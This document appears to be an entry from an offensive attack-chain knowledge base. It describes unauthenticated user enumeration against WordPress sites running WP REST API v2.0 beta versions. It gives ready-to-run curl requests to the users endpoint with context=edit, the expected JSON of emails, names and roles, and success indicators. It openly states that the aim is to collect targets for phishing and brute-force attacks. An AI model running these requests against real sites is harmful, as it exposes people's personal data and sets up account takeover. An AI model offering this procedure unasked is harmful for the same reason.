---
id: ac-uuid-001
tags:
  - wordpress
  - rest-api
  - broken-access-control
  - information-disclosure
  - user-enumeration
type: attack_chain
tools: []
tactics:
  - '[[Discovery]]'
verified: false
platforms:
  - Web
submitted: true
complexity: low
created_at: '2024-01-01T00:00:00Z'
procedures:
  - '[[procedures/Exploit-WP-REST-API-User-Enumeration]]'
step_count: 1
techniques:
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:29:28.179Z'
description: >-
  Exploit missing access controls in the WP REST API users endpoint to disclose
  detailed information on all registered users without authentication.
skill_level: beginner
impact_level: high
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Account Discovery]]'
---
# Unauthenticated User Enumeration via WP REST API Edit Context

Multi-stage attack chain demonstrating a complete attack workflow.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 1 |
| Execution Time | ~1 minute |
| Skill Level | Beginner |
| Complexity | Low |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Reconnaissance] --> B[Information Disclosure]
    B --> C[Targeted Attacks]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- None (uses standard HTTP client like curl or browser)

### Target Environment

- WordPress site with WP REST API plugin enabled (v2.0-beta12 or v2.0-beta13)
- Web platform accessible over HTTP/HTTPS
- No specific ports required beyond standard 80/443

### Initial Access Requirements

- Public network access to the WordPress site
- No credentials or prior access needed

## Detailed Attack Procedures

### Step 1: User Enumeration
procedure: [[procedures/Exploit-WP-REST-API-User-Enumeration]]

**Objective**: Retrieve detailed user information including usernames, emails, names, registration dates, and roles to enable targeted phishing or brute-force attacks.

**Instructions**: Send an unauthenticated GET request to the users endpoint with the context=edit parameter to bypass access controls. Use [[commands/wp-rest-api-get-users-edit]] for basic retrieval:

```bash
curl -X GET "https://target.com/wp-json/wp/v2/users?context=edit"
```

For larger sites, include per_page to fetch more results using [[commands/wp-rest-api-get-users-edit-paginated]]:

```bash
curl -X GET "https://target.com/wp-json/wp/v2/users?context=edit&per_page=100"
```

Parse the JSON response to extract sensitive fields like email, first_name, last_name, registered_date, and capabilities.

**Expected Output**: JSON array of user objects, e.g., {"id":1,"username":"admin","email":"admin@example.com","first_name":"John","last_name":"Doe","registered_date":"2023-01-01T00:00:00","capabilities":{"administrator":true}}.

**Success Indicators**:
- JSON response contains user details without authentication prompt
- Multiple users listed with sensitive info like emails and roles
- No 401/403 errors indicating access denial

## Attack Chain Summary

### Key Achievements

1. Unauthenticated access to all user profiles
2. Exposure of emails and roles for phishing targeting
3. Facilitation of brute-force or social engineering attacks on admins

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Account Discovery]]

### MITRE ATT&CK Tactics

- [[Discovery]]

---
*Last updated: 2024-01-01T00:00:00Z*
